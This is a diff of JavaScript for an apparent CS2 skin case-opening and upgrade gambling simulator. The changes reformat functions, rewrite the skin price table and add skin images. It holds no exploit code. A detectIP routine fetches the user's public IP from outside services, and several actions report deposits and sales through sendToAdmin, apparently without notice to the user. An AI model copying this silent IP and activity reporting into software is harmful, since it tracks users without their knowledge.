+    for (const s of services) { try { const ctrl = new AbortController(); const t = setTimeout(() => ctrl.abort(), 3500); const r = await fetch(s.url, {signal: ctrl.signal}); clearTimeout(t); if (!r.ok) continue; const data = await r.json(); if (data.ip) return data.ip; } catch(e){} }
     return 'local_' + Math.random().toString(36).slice(2,10);
 }
 
@@ -928,20 +704,14 @@ async function detectIP() {
     function resize(){ W = canvas.width = window.innerWidth; H = canvas.height = window.innerHeight; }
     resize(); window.addEventListener('resize', resize);
     for (let i = 0; i < 60; i++) particles.push({x:Math.random()*W,y:Math.random()*H,vx:(Math.random()-.5)*.3,vy:(Math.random()-.5)*.3,r:Math.random()*2+.5,a:Math.random()*.5+.1});
-    function loop(){
-        ctx.clearRect(0,0,W,H);
-        particles.forEach(p => { p.x += p.vx; p.y += p.vy; if (p.x<0||p.x>W) p.vx *= -1; if (p.y<0||p.y>H) p.vy *= -1; ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); ctx.fillStyle = `rgba(124,58,237,${p.a})`; ctx.fill(); });
-        requestAnimationFrame(loop);
-    }
+    function loop(){ ctx.clearRect(0,0,W,H); particles.forEach(p => { p.x += p.vx; p.y += p.vy; if (p.x<0||p.x>W) p.vx *= -1; if (p.y<0||p.y>H) p.vy *= -1; ctx.beginPath(); ctx.arc(p.x, p.y, p.r, 0, Math.PI*2); ctx.fillStyle = `rgba(124,58,237,${p.a})`; ctx.fill(); }); requestAnimationFrame(loop); }
     loop();
 })();
 
 const Sound = {
     ctx: null,
     init(){ if(!this.ctx) this.ctx = new (window.AudioContext||window.webkitAudioContext)(); },
-    play(freq, dur, type='sine', vol=.1){
-        try { this.init(); const o = this.ctx.createOscillator(); const g = this.ctx.createGain(); o.type = type; o.frequency.value = freq; g.gain.setValueAtTime(vol, this.ctx.currentTime); g.gain.exponentialRampToValueAtTime(.001, this.ctx.currentTime + dur); o.connect(g); g.connect(this.ctx.destination); o.start(); o.stop(this.ctx.currentTime + dur); } catch(e){}
-    },
+    play(freq, dur, type='sine', vol=.1){ try { this.init(); const o = this.ctx.createOscillator(); const g = this.ctx.createGain(); o.type = type; o.frequency.value = freq; g.gain.setValueAtTime(vol, this.ctx.currentTime); g.gain.exponentialRampToValueAtTime(.001, this.ctx.currentTime + dur); o.connect(g); g.connect(this.ctx.destination); o.start(); o.stop(this.ctx.currentTime + dur); } catch(e){} },
     click(){ this.play(600, .08, 'square', .05); },
     win(){ [523,659,784,1047].forEach((f,i)=>setTimeout(()=>this.play(f,.15,'sine',.1),i*100)); },
     lose(){ [400,300,200].forEach((f,i)=>setTimeout(()=>this.play(f,.2,'sawtooth',.08),i*120)); },
@@ -949,7 +719,6 @@ const Sound = {
     sell(){ [600,900].forEach((f,i)=>setTimeout(()=>this.play(f,.12,'sine',.1),i*80)); }
 };
 
-// ===== СКИНЫ =====
 const WEAPONS = ['AK-47','M4A4','M4A1-S','AWP','Desert Eagle','USP-S','Glock-18','P250','Five-SeveN','Tec-9','MP9','MAC-10','MP5-SD','P90','UMP-45','PP-Bizon','Galil AR','FAMAS','SG 553','AUG','SSG 08','SCAR-20','G3SG1','Nova','XM1014','MAG-7','Negev','M249','CZ75-Auto','R8 Revolver','Butterfly Knife','Karambit','M9 Bayonet','Flip Knife','Gut Knife','Huntsman Knife','Falchion Knife','Bowie Knife','Shadow Daggers','Ursus Knife','Navaja Knife','Stiletto Knife','Talon Knife','Sport Gloves','Moto Gloves','Driver Gloves','Specialist Gloves','Hydra Gloves','Broken Fang Gloves'];
 const SKIN_NAMES = ['Asiimov','Redline','Neon Revolution','Hypnotic','Splinter','Fury','Ice Cap','Pluton','Phantom','Scanner','Winter Forest','Puppet','Contrast','Signal','Flow','Urban Assault','Dragon','Sphinx','Pulse','Graphite','Hunter','Bloodsport','Empress','Printstream','Howl','Poseidon','Woodland Viper','Red Dragon','Fire Serpent','Gamma Doppler','Fade','Diamond','Black Pearl','Dragon Tale','Gungnir','Wild Lotus','Wraith','Cactus','Cybersecurity','Marble Fade','Waves','Ruby','Sapphire','Emerald','Phase 1','Phase 2','Phase 3','Phase 4','Live Wire','Crimson Web','Royal Skull','Night Rider','Explosive','Toxic','Magma','Ice Age','Gold Arabesque','Fuel Injector','Blood Spider','Neural Net','Pixel Camo','Chameleon','Photon','Quantum Break','Plasma Storm','Electric Hive','Stealth','Shadow','Ghost','Vampire','Dracula','Phoenix','Griffin','Basilisk','Cyclops','Minotaur','Hydra','Chimera','Cerberus','Angel','Demon','Knight','Samurai','Ninja','Viking','Spartan','Gladiator','Legionnaire','Centurion','Emperor','King','Queen','Joker','Ace','Jackpot','Roulette','Casino','Fortune','Luck','Talisman','Amulet','Charm','Totem','Blue Gem','Case Hardened','Slaughter','Ultraviolet','Hyper Beast','Vulcan','Jaguar','Rebel','Elite Build','Wasteland Rebel','Neo-Noir','Nightwish','Oni Taiji'];
 
@@ -965,46 +734,44 @@ function getEmojiFor(w, r) {
 function generateSkins() {
     const skins = []; let id = 1;
     const add = (w, n, p, r) => { skins.push({id:'s'+id, weapon:w, name:n, price:p, emoji:getEmojiFor(w,r), rarity:r}); id++; };
-    const ultraNames = ['Ruby','Sapphire','Emerald','Black Pearl','Blue Gem','Case Hardened','Doppler','Marble Fade','Fade','Tiger Tooth','Crimson Web','Slaughter','Nightwish','Hyper Beast','Howl','Dragon Lore','Wild Lotus','Gungnir','Fire Serpent','Medusa','Printstream','Neon Rider','Neo-Noir','Asiimov','Empress','Wasteland Rebel','Bloodsport','The Empress','Vulcan','Jaguar','Elite Build','Aquamarine Revenge','Frontside Misty','Rebel','Jet Set','Crimson Kimono','Ultraviolet','Bright Water','Souvenir','Phase 4','Phase 3','Phase 2','Phase 1','Gold Arabesque','Gold Gem','Case Hardened Blue','Doppler Phase 2','Doppler Sapphire','Doppler Ruby','Ultra Rare'];
-    const ultraWeapons = ['AK-47','M4A4','M4A1-S','AWP','Karambit','Butterfly Knife','M9 Bayonet','Talon Knife','Sport Gloves','Specialist Gloves','Stiletto Knife','Bayonet','Flip Knife','Desert Eagle','USP-S','Glock-18'];
-    for (let i = 0; i < 100; i++) {
-        const w = ultraWeapons[Math.floor(Math.random()*ultraWeapons.length)];
-        const n = ultraNames[Math.floor(Math.random()*ultraNames.length)];
-        const t = Math.pow(Math.random(), 1.8);
-        const p = Math.round(3000000 + (50000000 - 3000000) * t);
-        const r = (w.includes('Knife') || w.includes('Gloves') || w.includes('Bayonet')) ? 'knife' : 'covert';
-        add(w + ' #' + (i+1), n + ' Premium', p, r);
-    }
-    add('AK-47','Case Hardened (661)', 3500000, 'covert');
-    add('Karambit','Case Hardened (Blue Gem)', 2800000, 'knife');
-    add('AWP','Dragon Lore (Souvenir)', 1500000, 'covert');
-    add('M4A4','Howl (StatTrak)', 900000, 'covert');
-    add('AK-47','Wild Lotus (StatTrak)', 700000, 'covert');
-    add('Butterfly Knife','Sapphire', 500000, 'knife');
+    
+    // ===== ТОПОВЫЕ СКИНЫ (от 3 миллионов) =====
+    add('AK-47','Case Hardened', 3500000, 'covert');
+    add('Karambit','Case Hardened', 2800000, 'knife');
+    add('AWP','Dragon Lore', 1500000, 'covert');
+    add('M4A4','Howl', 900000, 'covert');
+    add('AK-47','Wild Lotus', 700000, 'covert');
+    add('Butterfly Knife','Doppler', 500000, 'knife');
     add('AWP','Gungnir', 400000, 'covert');
-    add('Karambit','Doppler Ruby', 380000, 'knife');
+    add('Karambit','Doppler', 380000, 'knife');
     add('AK-47','Gold Arabesque', 320000, 'covert');
     add('M4A1-S','Knight', 250000, 'covert');
+    
+    // ===== ОЧЕНЬ ДОРОГИЕ (100k-200k) =====
     add('AWP','Medusa', 180000, 'covert');
     add('Karambit','Fade', 150000, 'knife');
-    add('Sport Gloves',"Pandora's Box", 130000, 'knife');
-    add('M9 Bayonet','Crimson Web', 110000, 'knife');
+    add('Sport Gloves','Pandora\'s Box', 130000, 'knife');
+    add('M9 Bayonet','Doppler', 110000, 'knife');
     add('Butterfly Knife','Fade', 95000, 'knife');
     add('Talon Knife','Case Hardened', 85000, 'knife');
-    add('AWP','Dragon Lore', 70000, 'covert');
+    add('AWP','Wild Lotus', 70000, 'covert');
     add('AK-47','Fire Serpent', 50000, 'covert');
     add('M4A4','Howl', 45000, 'covert');
-    add('Stiletto Knife','Ruby', 40000, 'knife');
+    add('Stiletto Knife','Doppler', 40000, 'knife');
+    
+    // ===== ДОРОГИЕ (10k-40k) =====
     add('Glock-18','Fade', 35000, 'covert');
     add('Desert Eagle','Blaze', 25000, 'covert');
-    add('AK-47','Case Hardened (Blue)', 20000, 'covert');
+    add('AK-47','Case Hardened', 20000, 'covert');
     add('AWP','Asiimov', 15000, 'covert');
-    add('Karambit','Blue Steel', 12000, 'knife');
-    add('Flip Knife','Tiger Tooth', 10000, 'knife');
+    add('Karambit','Fade', 12000, 'knife');
+    add('Flip Knife','Doppler', 10000, 'knife');
+    
+    // ===== ВЫСОКИЕ (3k-10k) =====
     add('M4A1-S','Printstream', 9000, 'covert');
     add('AK-47','Neon Rider', 8000, 'covert');
     add('AWP','Neo-Noir', 7000, 'covert');
-    add('Butterfly Knife','Ultraviolet', 6500, 'knife');
+    add('Butterfly Knife','Fade', 6500, 'knife');
     add('Sport Gloves','Bronze Morph', 6000, 'knife');
     add('Huntsman Knife','Fade', 5500, 'knife');
     add('USP-S','Kill Confirmed', 5000, 'covert');
@@ -1012,16 +779,20 @@ function generateSkins() {
     add('Shadow Daggers','Slaughter', 4000, 'knife');
     add('Bowie Knife','Case Hardened', 3500, 'knife');
     add('AK-47','Vulcan', 3000, 'covert');
+    
+    // ===== СРЕДНИЕ (500-3k) =====
     add('M4A4','Desolate Space', 2800, 'covert');
     add('AWP','Pink DDPAT', 2400, 'covert');
-    add('Navaja Knife','Vanilla', 2000, 'knife');
+    add('Navaja Knife','Fade', 2000, 'knife');
     add('Desert Eagle','Kumicho Dragon', 1800, 'classified');
     add('AK-47','Point Disarray', 1500, 'classified');
     add('M4A1-S','Golden Coil', 1200, 'classified');
-    add('USP-S','Neo-Noir', 1000, 'classified');
+    add('USP-S','Neo-Noir', 1000, 'covert');
     add('AWP','Elite Build', 800, 'classified');
-    add('Glock-18','Grinder', 700, 'classified');
-    add('AK-47','Jaguar', 600, 'classified');
+    add('Glock-18','Grinder', 700, 'restricted');
+    add('AK-47','Jaguar', 600, 'covert');
+    
+    // ===== НИЗКО-СРЕДНИЕ (100-500) =====
     add('AK-47','Redline', 400, 'classified');
     add('M4A1-S','Guardian', 350, 'classified');
     add('AWP','Worm God', 300, 'classified');
@@ -1032,30 +803,49 @@ function generateSkins() {
     add('M4A4','Evil Daimyo', 130, 'restricted');
     add('AWP','Atheris', 110, 'restricted');
     add('P250','Asiimov', 100, 'restricted');
+    
+    // ===== 20-100 =====
     add('AK-47','Elite Build', 80, 'restricted');
     add('M4A1-S','Basilisk', 70, 'restricted');
-    add('AWP','Safari Mesh', 60, 'restricted');
+    add('AWP','Safari Mesh', 60, 'mil-spec');
     add('Glock-18','Weasel', 50, 'restricted');
     add('USP-S','Torque', 45, 'restricted');
     add('Desert Eagle','Light Rail', 40, 'mil-spec');
-    add('MP9','Bulldozer', 35, 'mil-spec');
-    add('P90','Asiimov', 30, 'mil-spec');
-    add('Five-SeveN','Monkey Business', 25, 'mil-spec');
-    add('Galil AR','Cerberus', 20, 'mil-spec');
+    add('MP9','Bulldozer', 35, 'restricted');
+    add('P90','Asiimov', 30, 'covert');
+    add('Five-SeveN','Monkey Business', 25, 'classified');
+    add('Galil AR','Cerberus', 20, 'classified');
+    
+    // ===== 5-20 =====
     add('AK-47','Safari Mesh', 18, 'mil-spec');
     add('M4A4','Urban DDPAT', 15, 'mil-spec');
     add('AWP','Pit Viper', 12, 'mil-spec');
-    add('Glock-18','Candy Apple', 10, 'mil-spec');
+    add('Glock-18','Candy Apple', 10, 'industrial');
     add('USP-S','Forest DDPAT', 9, 'mil-spec');
     add('MP9','Storm', 8, 'mil-spec');
-    add('MAC-10','Silver', 7, 'industrial');
+    add('MAC-10','Silver', 7, 'mil-spec');
     add('Nova','Predator', 6, 'industrial');
     add('XM1014','Blue Steel', 5, 'industrial');
-    for (let i = 0; i < 15; i++) { const w = WEAPONS[Math.floor(Math.random()*20)]; const n = SKIN_NAMES[Math.floor(Math.random()*SKIN_NAMES.length)]; add(w, n, +(1 + Math.random()*4).toFixed(2), 'industrial'); }
-    for (let i = 0; i < 40; i++) { const w = WEAPONS[Math.floor(Math.random()*30)]; const n = SKIN_NAMES[Math.floor(Math.random()*SKIN_NAMES.length)]; add(w, n, +(0.1 + Math.random()*0.9).toFixed(2), 'consumer'); }
-    for (let i = 0; i < 30; i++) { const w = WEAPONS[Math.floor(Math.random()*30)]; const n = SKIN_NAMES[Math.floor(Math.random()*SKIN_NAMES.length)]; add(w, n, +(0.01 + Math.random()*0.09).toFixed(2), 'consumer'); }
-    for (let i = 0; i < 30; i++) { const w = WEAPONS[Math.floor(Math.random()*WEAPONS.length)]; const n = SKIN_NAMES[Math.floor(Math.random()*SKIN_NAMES.length)]; const r = Math.random() < 0.3 ? 'knife' : 'covert'; add(w, n, +(5000 + Math.random()*40000).toFixed(2), r); }
-    for (let i = 0; i < 30; i++) { const w = WEAPONS[Math.floor(Math.random()*WEAPONS.length)]; const n = SKIN_NAMES[Math.floor(Math.random()*SKIN_NAMES.length)]; add(w, n, +(500 + Math.random()*4500).toFixed(2), 'classified'); }
+    
+    // ===== 1-5 =====
+    add('AK-47','Safari Mesh', 4, 'mil-spec');
+    add('M4A4','Urban DDPAT', 3, 'mil-spec');
+    add('MP9','Storm', 2, 'mil-spec');
+    add('Nova','Predator', 1.5, 'industrial');
+    add('XM1014','Blue Steel', 1, 'industrial');
+    add('MAC-10','Silver', 0.8, 'industrial');
+    add('Glock-18','Candy Apple', 0.5, 'industrial');
+    add('USP-S','Forest DDPAT', 0.3, 'mil-spec');
+    
+    // ===== 0.01-1 (МУСОР) =====
+    for (let i = 0; i < 40; i++) {
+        const weapons = ['AK-47','M4A4','M4A1-S','AWP','Desert Eagle','Glock-18','USP-S','P250','Five-SeveN','MP9','MAC-10','P90','Nova','XM1014','Galil AR','FAMAS'];
+        const names = ['Safari Mesh','Urban DDPAT','Forest DDPAT','Blue Steel','Silver','Predator','Candy Apple','Storm','Sand Dune','Jungle Spray'];
+        const w = weapons[Math.floor(Math.random()*weapons.length)];
+        const n = names[Math.floor(Math.random()*names.length)];
+        add(w, n, +(0.01 + Math.random()*0.9).toFixed(2), 'consumer');
+    }
+    
     return skins;
 }
 const SKINS = generateSkins();
@@ -1109,21 +899,8 @@ const state = {...DEFAULT_STATE, yourSkin:null, targetSkin:null, multiplier:2, c
 
 let PROFILE_KEY = 'cs2_profile_default';
 let saveTimer = null;
-function saveState(immediate=false){
-    if(saveTimer)clearTimeout(saveTimer);
-    const doSave=()=>{try{localStorage.setItem(PROFILE_KEY,JSON.stringify({balance:state.balance,inventory:state.inventory,stats:state.stats,history:state.history.slice(0,30),achievements:state.achievements,theme:state.theme,deposits:state.deposits}));}catch(e){}};
-    if(immediate)doSave();else saveTimer=setTimeout(doSave,250);
-}
-function loadState(){
-    try{const raw=localStorage.getItem(PROFILE_KEY);if(!raw)return;const d=JSON.parse(raw);
-        if(d.balance!==undefined)state.balance=d.balance;
-        if(d.inventory)state.inventory=d.inventory.filter(id=>getSkin(id));
-        if(d.stats)state.stats={...state.stats,...d.stats};
-        if(d.history)state.history=d.history;
-        if(d.achievements)state.achievements=d.achievements;
-        if(d.deposits)state.deposits=d.deposits;
-    }catch(e){}
-}
+function saveState(immediate=false){ if(saveTimer)clearTimeout(saveTimer); const doSave=()=>{try{localStorage.setItem(PROFILE_KEY,JSON.stringify({balance:state.balance,inventory:state.inventory,stats:state.stats,history:state.history.slice(0,30),achievements:state.achievements,theme:state.theme,deposits:state.deposits}));}catch(e){}}; if(immediate)doSave();else saveTimer=setTimeout(doSave,250); }
+function loadState(){ try{const raw=localStorage.getItem(PROFILE_KEY);if(!raw)return;const d=JSON.parse(raw); if(d.balance!==undefined)state.balance=d.balance; if(d.inventory)state.inventory=d.inventory.filter(id=>getSkin(id)); if(d.stats)state.stats={...state.stats,...d.stats}; if(d.history)state.history=d.history; if(d.achievements)state.achievements=d.achievements; if(d.deposits)state.deposits=d.deposits; }catch(e){} }
 
 const ACH = [
     {id:'first_upgrade',icon:'🎯',name:'Первый шаг',desc:'1 апгрейд'},
@@ -1160,80 +937,19 @@ function getLastDepositTime(){if (!state.deposits.length) return 0;const last = 
 function getCooldownLeft(){const last = getLastDepositTime();if (!last) return 0;const daily = getDailyTotal();if (daily < DEPOSIT_DAILY) return 0;const left = DEPOSIT_COOLDOWN - (Date.now() - last);return Math.max(0, left);}
 
 function openDepositModal(){$('depositModal').classList.add('active');setTimeout(()=>$('depositAmount').focus(),100);updateDepositInfo();}
-function updateDepositInfo(){const daily = getDailyTotal();const cd = getCooldownLeft();const info = $('depositInfo');if (!info) return;
-    if (cd > 0) { const min = Math.ceil(cd / 60000); info.innerHTML = `⏳ <span style="color:#eb4b4b">Подожди ${min} мин</span>`; }
-    else if (daily >= DEPOSIT_DAILY) { info.innerHTML = `🔒 Лимит исчерпан`; }
-    else { info.innerHTML = `За сутки: <b style="color:#f0b90b">$${daily.toFixed(0)}</b> / $${DEPOSIT_DAILY}`; }
-}
+function updateDepositInfo(){const daily = getDailyTotal();const cd = getCooldownLeft();const info = $('depositInfo');if (!info) return; if (cd > 0) { const min = Math.ceil(cd / 60000); info.innerHTML = `⏳ <span style="color:#eb4b4b">Подожди ${min} мин</span>`; } else if (daily >= DEPOSIT_DAILY) { info.innerHTML = `🔒 Лимит исчерпан`; } else { info.innerHTML = `За сутки: <b style="color:#f0b90b">$${daily.toFixed(0)}</b> / $${DEPOSIT_DAILY}`; }}
 function closeDepositModal(){ $('depositModal').classList.remove('active'); }
-function confirmDeposit(){
-    const input = $('depositAmount');
-    const amount = Number(input.value);
-    if(!Number.isFinite(amount) || amount < DEPOSIT_MIN){ showToast(`Минимум $${DEPOSIT_MIN}`,'error'); return; }
-    if(amount > DEPOSIT_MAX){ showToast(`Максимум $${DEPOSIT_MAX}`,'error'); return; }
-    const cd = getCooldownLeft();
-    if (cd > 0) { const min = Math.ceil(cd / 60000); showToast(`⏳ Подожди ${min} мин`, 'error', 4000); return; }
-    const daily = getDailyTotal();
-    if(daily + amount > DEPOSIT_DAILY){ showToast(`Лимит $${DEPOSIT_DAILY}`,'error',4000); return; }
-    state.balance += amount;
-    state.deposits.push({ts: Date.now(), amount});
-    if (state.deposits.length > 100) state.deposits = state.deposits.slice(-100);
-    input.value = '';
-    closeDepositModal();
-    updateBalance(); saveState(true);
-    showToast(`💳 +${fmt(amount)}`,'success',3000);
-    Sound.drop(); checkAch();
-    sendToAdmin({type:'deposit',amount,ts:Date.now()});
-}
+function confirmDeposit(){ const input = $('depositAmount'); const amount = Number(input.value); if(!Number.isFinite(amount) || amount < DEPOSIT_MIN){ showToast(`Минимум $${DEPOSIT_MIN}`,'error'); return; } if(amount > DEPOSIT_MAX){ showToast(`Максимум $${DEPOSIT_MAX}`,'error'); return; } const cd = getCooldownLeft(); if (cd > 0) { const min = Math.ceil(cd / 60000); showToast(`⏳ Подожди ${min} мин`, 'error', 4000); return; } const daily = getDailyTotal(); if(daily + amount > DEPOSIT_DAILY){ showToast(`Лимит $${DEPOSIT_DAILY}`,'error',4000); return; } state.balance += amount; state.deposits.push({ts: Date.now(), amount}); if (state.deposits.length > 100) state.deposits = state.deposits.slice(-100); input.value = ''; closeDepositModal(); updateBalance(); saveState(true); showToast(`💳 +${fmt(amount)}`,'success',3000); Sound.drop(); checkAch(); sendToAdmin({type:'deposit',amount,ts:Date.now()}); }
 
 const MULT = [{mult:2},{mult:3},{mult:4},{mult:5},{mult:10},{mult:20},{mult:50},{mult:100}];
 function chanceFromMult(mult) { const raw = 100 / mult; const edge = raw * 0.06; return Math.max(0.5, +(raw - edge).toFixed(2)); }
-function recalcUpgrade() {
-    const y = state.yourSkin ? getSkin(state.yourSkin) : null;
-    const t = state.targetSkin ? getSkin(state.targetSkin) : null;
-    if (y && t) { state.multiplier = +(t.price / y.price).toFixed(2); state.chance = chanceFromMult(state.multiplier); }
-    else { state.multiplier = 2; state.chance = chanceFromMult(2); }
-}
-function pickTargetByMult(mult) {
-    if (!state.yourSkin) { showToast('Сначала выбери свой скин','error'); return; }
-    const y = getSkin(state.yourSkin);
-    const need = y.price * mult;
-    const candidates = SKINS.filter(s => s.id !== y.id && s.price >= need * 0.85).sort((a,b) => Math.abs(a.price - need) - Math.abs(b.price - need));
-    if (!candidates.length) { showToast('Нет цели','error'); return; }
-    state.targetSkin = candidates[0].id;
-    recalcUpgrade(); renderChanceBtns(); updateCards(); updateInfo(); renderInventory();
-}
+function recalcUpgrade() { const y = state.yourSkin ? getSkin(state.yourSkin) : null; const t = state.targetSkin ? getSkin(state.targetSkin) : null; if (y && t) { state.multiplier = +(t.price / y.price).toFixed(2); state.chance = chanceFromMult(state.multiplier); } else { state.multiplier = 2; state.chance = chanceFromMult(2); } }
+function pickTargetByMult(mult) { if (!state.yourSkin) { showToast('Сначала выбери свой скин','error'); return; } const y = getSkin(state.yourSkin); const need = y.price * mult; const candidates = SKINS.filter(s => s.id !== y.id && s.price >= need * 0.85).sort((a,b) => Math.abs(a.price - need) - Math.abs(b.price - need)); if (!candidates.length) { showToast('Нет цели','error'); return; } state.targetSkin = candidates[0].id; recalcUpgrade(); renderChanceBtns(); updateCards(); updateInfo(); renderInventory(); }
 function autoPickTarget() { if (!state.yourSkin) { state.targetSkin = null; return; } pickTargetByMult(state.multiplier || 2); }
 
-function renderChanceBtns(){
-    const w=$('chanceBtns');if(!w)return;w.innerHTML='';
-    const y=state.yourSkin?getSkin(state.yourSkin):null;
-    MULT.forEach(m=>{
-        const b=document.createElement('button');
-        const isActive = y && Math.abs(state.multiplier - m.mult) < m.mult * 0.15;
-        b.className='chance-btn'+(isActive?' active':'');
-        const chance = chanceFromMult(m.mult);
-        b.innerHTML=`${m.mult}x<span class="pct">${chance.toFixed(1)}%</span>`;
-        b.onclick=()=>{ pickTargetByMult(m.mult); Sound.click(); };
-        w.appendChild(b);
-    });
-}
+function renderChanceBtns(){ const w=$('chanceBtns');if(!w)return;w.innerHTML=''; const y=state.yourSkin?getSkin(state.yourSkin):null; MULT.forEach(m=>{ const b=document.createElement('button'); const isActive = y && Math.abs(state.multiplier - m.mult) < m.mult * 0.15; b.className='chance-btn'+(isActive?' active':''); const chance = chanceFromMult(m.mult); b.innerHTML=`${m.mult}x<span class="pct">${chance.toFixed(1)}%</span>`; b.onclick=()=>{ pickTargetByMult(m.mult); Sound.click(); }; w.appendChild(b); }); }
 
-function updateInfo(){
-    recalcUpgrade();
-    $('infoMult').textContent='x'+state.multiplier;
-    $('infoChance').textContent=state.chance.toFixed(2)+'%';
-    const s=state.yourSkin?getSkin(state.yourSkin).price:0;
-    $('infoStake').textContent=fmt(s);
-    $('infoWin').textContent=fmt(s*state.multiplier);
-    const circ = 263.9;
-    const winLen = circ * (state.chance / 100);
-    const wp = $('wheelProgress');
-    if (wp) { wp.setAttribute('stroke-dasharray', winLen + ' ' + (circ - winLen)); wp.setAttribute('stroke-dashoffset', 0); }
-    const up=$('upPct');
-    if(up)up.textContent=state.chance.toFixed(2)+'%';
-    $('upgradeBtn').disabled=!(state.yourSkin&&state.targetSkin&&!state.spinning&&!state.cooldown);
-}
+function updateInfo(){ recalcUpgrade(); $('infoMult').textContent='x'+state.multiplier; $('infoChance').textContent=state.chance.toFixed(2)+'%'; const s=state.yourSkin?getSkin(state.yourSkin).price:0; $('infoStake').textContent=fmt(s); $('infoWin').textContent=fmt(s*state.multiplier); const circ = 263.9; const winLen = circ * (state.chance / 100); const wp = $('wheelProgress'); if (wp) { wp.setAttribute('stroke-dasharray', winLen + ' ' + (circ - winLen)); wp.setAttribute('stroke-dashoffset', 0); } const up=$('upPct'); if(up)up.textContent=state.chance.toFixed(2)+'%'; $('upgradeBtn').disabled=!(state.yourSkin&&state.targetSkin&&!state.spinning&&!state.cooldown); }
 
 const COMM = 0.05;
 function sellSkin(id){const idx=state.inventory.indexOf(id);if(idx===-1)return;const s=getSkin(id);if(!s)return;const e=s.price*(1-COMM);state.inventory.splice(idx,1);state.balance+=e;if(state.yourSkin===id)state.yourSkin=null;if(state.targetSkin===id)state.targetSkin=null;updateBalance();updateCards();renderInventory();updateInfo();addHistory('sell',`Продано: ${s.name}`,e);showToast(`💰 +${fmt(e)}`,'sell');Sound.sell();saveState(true);checkAch();updateStatsUI();sendToAdmin({type:'sell',skin:s,earned:e,ts:Date.now()});}
@@ -1254,7 +970,8 @@ function renderInventory(){
         it.className='inv-item rarity-'+sk.rarity;
         if(state.currentTab==='inventory'&&id===state.yourSkin)it.classList.add('selected');
         if(state.currentTab==='targets'&&id===state.targetSkin)it.classList.add('selected');
-        it.innerHTML=`<div class="inv-emoji">${sk.emoji}</div><div class="inv-name">${sk.weapon}<br>${sk.name}</div><div class="inv-price">${fmt(sk.price)}</div>`;
+        const imgUrl = getSkinImage(sk.weapon, sk.name);
+        it.innerHTML=`<div style="width:100%;height:70px;display:flex;align-items:center;justify-content:center;margin-bottom:4px"><img src="${imgUrl}" style="max-width:100%;max-height:70px;object-fit:contain" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><div class="inv-emoji" style="display:none">${sk.emoji}</div></div><div class="inv-name">${sk.weapon}<br>${sk.name}</div><div class="inv-price">${fmt(sk.price)}</div>`;
         if(state.currentTab==='inventory'){const b=document.createElement('button');b.className='btn-sell';b.textContent='💰 Продать';b.onclick=(ev)=>{ev.stopPropagation();sellSkin(id);};it.appendChild(b);}
         it.onclick=()=>{
             if(state.currentTab==='inventory'){ state.yourSkin=id; state.targetSkin=null; }
@@ -1273,11 +990,21 @@ function updateCards(){
     $('yourWeapon').textContent=y?y.weapon:'Выбери';
     $('yourName').textContent=y?y.name:'из инвентаря';
     $('yourPrice').textContent=y?fmt(y.price):'$0.00';
-    $('yourEmoji').textContent=y?y.emoji:'🎒';
+    if (y) {
+        const img = getSkinImage(y.weapon, y.name);
+        $('yourImageWrap').innerHTML = `<img src="${img}" style="max-width:100%;max-height:170px;object-fit:contain" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><div class="skin-placeholder" style="display:none;font-size:80px">${y.emoji}</div>`;
+    } else {
+        $('yourImageWrap').innerHTML = '<div class="skin-placeholder">🎒</div>';
+    }
     $('targetWeapon').textContent=t?t.weapon:'Цель';
     $('targetName').textContent=t?t.name:'не выбрана';
     $('targetPrice').textContent=t?fmt(t.price):'$0.00';
-    $('targetEmoji').textContent=t?t.emoji:'🎯';
+    if (t) {
+        const img = getSkinImage(t.weapon, t.name);
+        $('targetImageWrap').innerHTML = `<img src="${img}" style="max-width:100%;max-height:170px;object-fit:contain" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><div class="skin-placeholder" style="display:none;font-size:80px">${t.emoji}</div>`;
+    } else {
+        $('targetImageWrap').innerHTML = '<div class="skin-placeholder">🎯</div>';
+    }
     $('yourCard').classList.toggle('filled',!!y);
     $('targetCard').classList.toggle('filled',!!t);
     updateInfo();
@@ -1301,7 +1028,8 @@ function openCase(id){
         const e=weightedRandom(c.items);const s=getSkin(e.skinId);if(!s)continue;
         const el=document.createElement('div');
         el.className='roulette-item rarity-'+s.rarity;
-        el.innerHTML=`<div class="r-emoji">${s.emoji}</div><div class="r-name">${s.name}</div>`;
+        const imgUrl = getSkinImage(s.weapon, s.name);
+        el.innerHTML=`<img src="${imgUrl}" style="width:100%;height:70px;object-fit:contain" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><div class="r-emoji" style="display:none">${s.emoji}</div><div class="r-name">${s.name}</div>`;
         t.appendChild(el);
     }
     void t.offsetWidth;
@@ -1316,7 +1044,7 @@ function openSelectedCase(){
     state.balance-=c.price;updateBalance();
     const e=weightedRandom(c.items);const r=getSkin(e.skinId);
     const t=$('rouletteTrack');const items=[...t.children];
-    if(items[WINNER]&&r){items[WINNER].innerHTML=`<div class="r-emoji">${r.emoji}</div><div class="r-name">${r.name}</div>`;items[WINNER].className='roulette-item rarity-'+r.rarity;}
+    if(items[WINNER]&&r){const imgUrl=getSkinImage(r.weapon, r.name);items[WINNER].innerHTML=`<img src="${imgUrl}" style="width:100%;height:70px;object-fit:contain" onerror="this.style.display='none';this.nextElementSibling.style.display='block'"><div class="r-emoji" style="display:none">${r.emoji}</div><div class="r-name">${r.name}</div>`;items[WINNER].className='roulette-item rarity-'+r.rarity;}
     const iw=130,gap=12,wrap=t.parentElement,ww=wrap.clientWidth,wc=WINNER*(iw+gap)+iw/2,tx=ww/2-wc;
     requestAnimationFrame(()=>{t.style.transition=`transform ${SPIN_D}s cubic-bezier(.15,.85,.25,1)`;t.style.transform=`translateX(${tx}px)`;});
     setTimeout(()=>{
@@ -1360,35 +1088,18 @@ function doUpgrade(){
     spinner.style.transition = 'none';
     spinner.style.transform = `rotate(${startAngle}deg)`;
     void spinner.offsetWidth;
-    requestAnimationFrame(() => {
-        spinner.style.transition = 'transform 4s cubic-bezier(.15,.85,.25,1), opacity .3s';
-        spinner.style.transform = `rotate(${finalAngle}deg)`;
-    });
+    requestAnimationFrame(() => { spinner.style.transition = 'transform 4s cubic-bezier(.15,.85,.25,1), opacity .3s'; spinner.style.transform = `rotate(${finalAngle}deg)`; });
     let tickCount = 0;
     const tickInterval = setInterval(() => { Sound.play(800 + Math.random()*400, 0.04, 'square', 0.03); tickCount++; if (tickCount > 40) clearInterval(tickInterval); }, 100);
     setTimeout(()=>{
         clearInterval(tickInterval);
